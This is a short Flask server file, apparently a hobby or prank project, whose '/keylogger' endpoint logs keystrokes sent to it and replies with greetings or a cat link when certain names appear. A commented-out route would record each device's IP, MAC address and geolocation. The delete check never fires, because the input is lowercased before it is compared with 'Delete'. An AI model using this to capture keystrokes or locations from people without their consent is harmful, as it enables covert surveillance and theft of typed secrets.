from flask import Response
from flask import request
from flask import send_file
from URLs import *
import os


@app.route('/keylogger', methods=["GET", "POST"])
def check_word():
    word = request.args.get('char').lower()
    if word != 'Delete':
        string_file = open('./string_data', 'a')
        string_file.write(word)
        string_file.close()
    else:
        string_file = open('./string_data', 'rb+')
        string_file.seek(-1, os.SEEK_END)
        string_file.truncate()

    string_file = open('./string_data', 'r')
    string_content = string_file.read()
    string_file.close()
    
    if 'yoni' in string_content:
        delete_content()
        return Response('hi yoni', status=200, mimetype='application/json')
    if 'itay' in string_content:
        delete_content()
        return Response('hi itay', status=200, mimetype='application/json')
    if 'cat' in string_content:
        delete_content()
        return Response(cat_url, status=200, mimetype='application/json')
    return Response('', status=200, mimetype='application/json')

def delete_content():
    string_file = open('./string_data', 'w')
    string_file.write('')
    string_file.close()

# @app.route('/update', methods=["POST"])
# def update():
#     ip = request.form['ip']
#     name = request.form['name']
#     latitude = request.form['latitude']
#     longitude = request.form['longitude']
#     country = request.form['country']
#     city = request.form['city']
#     mac = request.form['mac']
#     try:
#         db.session.query(User).filter(User.mac == mac).one()
#         return Response("Device is already in database", status=200, mimetype='application/json')
#     except:
#         new_user = User(mac, ip, name, latitude, longitude, country, city)
#         db.session.add(new_user)
#         db.session.commit()
#         return Response("Welcome " + name, status=200, mimetype='application/json')






